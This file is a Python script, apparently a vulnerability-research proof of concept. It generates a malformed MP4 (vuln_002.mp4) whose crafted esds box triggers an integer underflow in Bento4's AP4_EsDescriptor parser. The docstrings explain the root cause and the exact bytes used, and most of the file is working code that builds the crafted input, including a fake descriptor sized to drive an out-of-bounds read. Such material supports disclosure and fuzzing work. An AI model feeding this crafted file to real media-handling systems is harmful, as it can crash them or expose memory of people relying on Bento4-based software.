#!/usr/bin/env python3
"""
PoC generator for VULN 002:
  Integer Underflow in AP4_EsDescriptor creates oversize SubStream (OOB Read)

Root cause (Ap4EsDescriptor.cpp, constructor):
  - Reads ES_ID(2B) + flags(1B) = 3 bytes
  - If (m_Flags & AP4_ES_DESCRIPTOR_FLAG_STREAM_DEPENDENCY) reads DependsOn(2B)
    → total consumed = 5 bytes
  - Substream size: payload_size - AP4_Size(offset - start)
    = 4 - 5  →  uint32_t underflow → 0xFFFFFFFF

Trigger: ES_Descriptor with tag=0x03, payload_size=4:
  payload bytes:
    [0x00 0x01]  ES_ID = 1
    [0x20]       flags byte: bits>>5 = 1 → STREAM_DEPENDENCY flag set
    [0x00]       first byte of DependsOn (still within 4-byte payload)
    [0x00]       second byte of DependsOn  ← read PAST the declared payload end
  → 5 bytes consumed, declared 4 → underflow to 0xFFFFFFFF SubStream size

After the ES_Descriptor, we place a fake DecoderSpecificInfo (tag=0x05) with
expandable size 0x0FFFFFFF so the overflowed SubStream's parsing loop tries to
allocate/read a massive amount of data, exercising the OOB path.
"""

import struct
import os

OUTPUT_DIR = (
    "/data/ylwang/non-textfuzz/target/_poc/Bento4/"
    "Source_C++_Core_Ap4DescriptorFactory_h"
)
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_002.mp4")


# ---------------------------------------------------------------------------
# Generic MP4 box helpers
# ---------------------------------------------------------------------------

def pack_box(box_type: str, data: bytes) -> bytes:
    """Build an ISO base-media file-format box: size(4B BE) + type(4B) + data."""
    size = 8 + len(data)
    return struct.pack(">I4s", size, box_type.encode("ascii")) + data


def expandable_size(n: int) -> bytes:
    """MPEG-4 expandable (variable-length) size encoding."""
    if n < 0x80:
        return bytes([n])
    result = []
    while n > 0x7F:
        result.append((n & 0x7F) | 0x80)
        n >>= 7
    result.append(n)
    return bytes(reversed(result))


def descriptor(tag: int, payload: bytes) -> bytes:
    """Build a descriptor: tag(1B) + expandable_size + payload."""
    return bytes([tag]) + expandable_size(len(payload)) + payload


# ---------------------------------------------------------------------------
# Malicious esds construction
# ---------------------------------------------------------------------------

def build_esds() -> bytes:
    """
    Build an esds box containing an ES_Descriptor that triggers integer
    underflow in AP4_EsDescriptor::AP4_EsDescriptor(stream, header_size,
    payload_size).

    Layout of the ES_Descriptor bytes in the stream:
      [0x03]        tag  (consumed by CreateDescriptorFromStream)
      [0x04]        payload_size = 4  (consumed by CreateDescriptorFromStream)
      ── payload start (`start`) ──────────────────────────────────────────
      [0x00][0x01]  ES_ID = 1          (bytes 0-1 of declared 4-byte payload)
      [0x20]        flags byte         (byte 2):
                      m_Flags = (0x20>>5)&7 = 1
                      AP4_ES_DESCRIPTOR_FLAG_STREAM_DEPENDENCY = 1  → SET
      [0x00]        DependsOn high     (byte 3, last byte inside declared payload)
      [0x00]        DependsOn low      ← byte 5 consumed, PAST payload end!
      ── SubStream anchor (`offset`) with size = 4-5 = 0xFFFFFFFF ────────
      [0x05]        fake DecoderSpecificInfo tag  (SubStream reads from here)
      [0xFF][0xFF][0xFF][0x7F]  expandable size = 0x0FFFFFFF
      [0xAA × 8]    padding (SubStream consumes any available file bytes)

    When the while-loop inside AP4_EsDescriptor calls
    CreateDescriptorFromStream(*substream, descriptor), the SubStream
    with size=0xFFFFFFFF allows reading beyond the declared payload end.
    The fake 0x05 descriptor causes AP4_DecoderSpecificInfoDescriptor to
    call SetDataSize(0x0FFFFFFF) and stream.Read(buf, 0x0FFFFFFF), with the
    SubStream clamping the read to (0xFFFFFFFF - 5) = 0xFFFFFFFA bytes –
    larger than the 0x0FFFFFFF-byte buffer – exposing the OOB condition.
    """

    # ── ES_Descriptor header ──────────────────────────────────────────────
    # Manually encode tag=0x03 + single-byte size=4 (NOT via descriptor())
    # to guarantee payload_size=4 exactly (triggering the underflow).
    es_tag       = bytes([0x03])
    es_size      = bytes([0x04])   # payload_size declared as 4
    es_id        = struct.pack(">H", 0x0001)   # 2 bytes
    flags_byte   = bytes([0x20])               # STREAM_DEPENDENCY set (bit5)
    depends_high = bytes([0x00])               # DependsOn byte 1 (within payload)
    depends_low  = bytes([0x00])               # DependsOn byte 2 (OOB of payload)

    # Bytes that the overflowed SubStream will parse:
    #   tag=0x05, expandable size = 0x0FFFFFFF (4-byte encoding)
    fake_tag      = bytes([0x05])
    fake_size_enc = bytes([0xFF, 0xFF, 0xFF, 0x7F])  # = 0x0FFFFFFF
    fake_padding  = bytes([0xAA] * 8)

    es_descriptor_bytes = (
        es_tag
        + es_size
        + es_id
        + flags_byte
        + depends_high
        + depends_low
        + fake_tag
        + fake_size_enc
        + fake_padding
    )

    # esds full-box: version/flags(4B=0) + descriptor bytes
    esds_content = struct.pack(">I", 0) + es_descriptor_bytes
    return pack_box("esds", esds_content)


# ---------------------------------------------------------------------------
# Full minimal MP4 builder
# ---------------------------------------------------------------------------

def build_mp4() -> bytes:
    """
    Build a minimal MP4 that routes through:
      moov → trak → mdia → minf → stbl → stsd → mp4a → esds
    """
    esds = build_esds()

    # mp4a sample entry
    mp4a_body = (
        bytes(6)                         # reserved
        + struct.pack(">H", 1)           # data-reference-index
        + bytes(8)                       # reserved
        + struct.pack(">H", 2)           # channel count
        + struct.pack(">H", 16)          # sample size (bits)
        + struct.pack(">H", 0)           # pre-defined
        + struct.pack(">H", 0)           # reserved
        + struct.pack(">HH", 44100, 0)   # sample rate (16.16 fixed-point)
        + esds
    )
    mp4a = pack_box("mp4a", mp4a_body)

    # stsd: version/flags(4B) + entry-count(4B) + entries
    stsd = pack_box("stsd", struct.pack(">II", 0, 1) + mp4a)
    stts = pack_box("stts", struct.pack(">II", 0, 0))
    stbl = pack_box("stbl", stsd + stts)

    dref = pack_box(
        "dref",
        struct.pack(">II", 0, 1) + pack_box("url ", struct.pack(">I", 1)),
    )
    dinf = pack_box("dinf", dref)
    smhd = pack_box("smhd", struct.pack(">IHH", 0, 0, 0))
    minf = pack_box("minf", smhd + dinf + stbl)

    mdhd = pack_box(
        "mdhd",
        struct.pack(">IIIIIIH", 0, 0, 0, 44100, 0, 0x55C4, 0),
    )
    hdlr = (
        pack_box("hdlr", struct.pack(">II4s", 0, 0, b"soun") + bytes(12) + b"\x00")
    )
    mdia = pack_box("mdia", mdhd + hdlr + minf)

    tkhd_flags = 0x000003
    tkhd = pack_box(
        "tkhd",
        struct.pack(">IIIIIII", tkhd_flags, 0, 0, 1, 0, 0, 0)
        + bytes(8)
        + struct.pack(">II", 0, 0)
        + struct.pack(">iiiiiiii", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0)
        + struct.pack(">i", 0x40000000),
    )
    trak = pack_box("trak", tkhd + mdia)

    mvhd = pack_box(
        "mvhd",
        struct.pack(">IIIII", 0, 0, 0, 44100, 0)
        + struct.pack(">ih", 0x00010000, 0x0100)
        + bytes(10)
        + struct.pack(">iiiiiiiii", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
        + bytes(24)
        + struct.pack(">I", 2),
    )
    moov = pack_box("moov", mvhd + trak)

    ftyp = pack_box("ftyp", b"M4A " + struct.pack(">I", 0) + b"M4A " + b"mp42" + b"isom")
    mdat = pack_box("mdat", b"")

    return ftyp + moov + mdat


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    mp4_data = build_mp4()
    with open(OUTPUT_FILE, "wb") as f:
        f.write(mp4_data)
    print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_FILE}")
    print(f"[+] ES_Descriptor: tag=0x03, payload_size=4, flags=0x20 (STREAM_DEPENDENCY)")
    print(f"[+] Trigger: 5 bytes consumed vs 4 declared → SubStream size = 4-5 = 0xFFFFFFFF")
    print(f"[+] Fake descriptor tag=0x05 at SubStream start, declared size=0x0FFFFFFF")


if __name__ == "__main__":
    main()
